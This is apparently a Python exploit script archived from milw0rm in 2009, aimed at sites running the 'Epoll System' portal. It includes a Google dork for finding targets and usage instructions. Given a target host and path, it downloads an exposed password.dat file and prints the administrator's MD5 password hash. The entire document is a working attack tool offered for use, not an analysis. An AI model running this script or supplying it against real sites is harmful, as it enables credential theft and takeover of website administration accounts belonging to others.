#!/usr/bin/python
#Portal Name: EPOLL SYSTEM
#Version : All version
#'Google Dork : Powered by Egorix
#Exploit Coded by: Pouya_Server
#Exploit Discovered by: Pouya_Server
#Contact Me : Pouya.s3rver@Gmail.com
#Epoll system login page = www.site.com/[Path]/admin.php
import urllib
import sys
import parser
serv="http://"
i=0
for arg in sys.argv:
     i=i+1
if i!=3:
 print """\n\n
         \tEpoll System   (password.dat)
          \tUsage:exploit.py [targetsite] [path]
          \tExample:exploit.py www.target.com /Path/
          \tResult= Admin Pass [MD5]" \n\n"""
else:

    adres=sys.argv[1]
    path=sys.argv[2]
    str1=adres.join([serv,path])
    str2=str1.join(['','/password.dat'])
    print "\n[~]Connecting..."
    url=urllib.urlopen(str2).read();
    print "\n[+]Connected!"

    test=url.find(path);
    t=0;
    print "\n\t\t\t-=[Admin Password]=-"
    while(url[test+1]!=1): # Pouya
              print url[test],
              if(url[test]=='\n'):
                 t=t+1;
              if(t==2):
                 break;

              test=test+1;
    print "\n\n\t\t\t[ Coded by Pouya_Server ]"

# milw0rm.com [2009-01-25]